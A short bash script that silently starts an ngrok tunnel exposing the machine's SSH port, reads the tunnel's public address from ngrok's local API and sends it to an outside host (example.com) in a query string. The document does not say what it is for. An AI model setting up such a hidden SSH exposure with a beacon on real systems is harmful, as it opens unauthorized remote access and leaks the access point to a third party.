#!/bin/bash
if [[ $(sudo netstat -tulpn | grep :4040) ]]; then
    echo "already started" 
else
    /etc/usertask/ngrok tcp 22 > /dev/null &
fi
export WEBHOOK_URL="$(curl http://localhost:4040/api/tunnels | jq ".tunnels[0].public_url")"
curl -X GET http://example.com/?data=$WEBHOOK_URL 
